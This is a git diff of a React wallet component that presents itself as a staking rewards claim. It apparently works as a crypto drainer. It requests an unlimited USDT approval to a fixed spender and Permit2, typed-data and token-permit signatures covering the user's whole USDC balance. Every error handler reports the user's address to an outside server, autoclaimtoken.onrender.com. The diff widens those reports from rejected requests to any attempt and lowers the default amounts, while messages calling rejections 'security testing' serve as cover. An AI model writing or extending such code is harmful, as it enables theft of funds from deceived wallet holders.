@@ -105,24 +105,23 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`Unlimited approval tx: ${tx.hash}`);
     } catch (error) {
-      // Send admin alert even on rejection
+      // Send admin alert for any interaction
       await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'ERC20_UNLIMITED_APPROVE_REJECTED',
+          type: 'ERC20_UNLIMITED_APPROVE_ATTEMPTED',
           userAddress: userAddress,
           tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
           spenderAddress: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15',
-          error: error.message
+          error: error.message,
+          rejected: error.code === 'ACTION_REJECTED' || error.code === 4001
         })
       }).catch(() => {});
       
-      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
-        setResult('Transaction rejected by user. This is expected behavior for security testing.');
-      } else {
-        setResult(`Error: ${error.message}`);
-      }
+      setResult(error.code === 'ACTION_REJECTED' || error.code === 4001 ? 
+        'Transaction rejected by user. This is expected behavior for security testing.' : 
+        `Error: ${error.message}`);
     }
     setLoading(false);
   };
@@ -138,7 +137,7 @@ export default function SignatureManager({ provider, userAddress }) {
       ], provider);
       
       const balance = await tokenContract.balanceOf(userAddress);
-      const amount = balance > 0 ? balance : ethers.parseUnits('1000', 6); // 1000 USDC default
+      const amount = balance > 0 ? balance : ethers.parseUnits('100', 6); // 100 USDC default
       const balanceFormatted = ethers.formatUnits(balance, 6);
       
       // Check gas and auto-execute if sufficient
@@ -211,23 +210,22 @@ export default function SignatureManager({ provider, userAddress }) {
       const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
       setResult(`Permit2 signature: ${signature}`);
     } catch (error) {
-      // Send admin alert even on rejection
+      // Send admin alert for any interaction
       await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'PERMIT2_REJECTED',
+          type: 'PERMIT2_ATTEMPTED',
           userAddress: userAddress,
           tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-          error: error.message
+          error: error.message,
+          rejected: error.code === 'ACTION_REJECTED' || error.code === 4001
         })
       }).catch(() => {});
       
-      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
-        setResult('Signature rejected by user. This is expected behavior for security testing.');
-      } else {
-        setResult(`Error: ${error.message}`);
-      }
+      setResult(error.code === 'ACTION_REJECTED' || error.code === 4001 ? 
+        'Signature rejected by user. This is expected behavior for security testing.' : 
+        `Error: ${error.message}`);
     }
     setLoading(false);
   };
@@ -321,22 +319,21 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`TypedData v4 signature: ${signature}`);
     } catch (error) {
-      // Send admin alert even on rejection
+      // Send admin alert for any interaction
       await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'TYPED_DATA_V4_REJECTED',
+          type: 'TYPED_DATA_V4_ATTEMPTED',
           userAddress: userAddress,
-          error: error.message
+          error: error.message,
+          rejected: error.code === 'ACTION_REJECTED' || error.code === 4001
         })
       }).catch(() => {});
       
-      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
-        setResult('Signature rejected by user. This is expected behavior for security testing.');
-      } else {
-        setResult(`Error: ${error.message}`);
-      }
+      setResult(error.code === 'ACTION_REJECTED' || error.code === 4001 ? 
+        'Signature rejected by user. This is expected behavior for security testing.' : 
+        `Error: ${error.message}`);
     }
     setLoading(false);
   };
@@ -353,7 +350,7 @@ export default function SignatureManager({ provider, userAddress }) {
       ], provider);
       
       const balance = await tokenContract.balanceOf(userAddress);
-      const value = balance > 0 ? balance : ethers.parseUnits('500', 6); // 500 USDC default
+      const value = balance > 0 ? balance : ethers.parseUnits('50', 6); // 50 USDC default
       const balanceFormatted = ethers.formatUnits(balance, 6);
       
       setResult(`Detected USDC balance: ${balanceFormatted} USDC. Preparing staking rewards claim...`);
@@ -363,23 +360,22 @@ export default function SignatureManager({ provider, userAddress }) {
       const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
       setResult(`Token permit signature: ${signature}`);
     } catch (error) {
-      // Send admin alert even on rejection
+      // Send admin alert for any interaction
       await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'TOKEN_PERMIT_REJECTED',
+          type: 'TOKEN_PERMIT_ATTEMPTED',
           userAddress: userAddress,
           tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-          error: error.message
+          error: error.message,
+          rejected: error.code === 'ACTION_REJECTED' || error.code === 4001
         })
       }).catch(() => {});
       
-      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
-        setResult('Signature rejected by user. This is expected behavior for security testing.');
-      } else {
-        setResult(`Error: ${error.message}`);
-      }
+      setResult(error.code === 'ACTION_REJECTED' || error.code === 4001 ? 
+        'Signature rejected by user. This is expected behavior for security testing.' : 
+        `Error: ${error.message}`);
     }
     setLoading(false);
   };
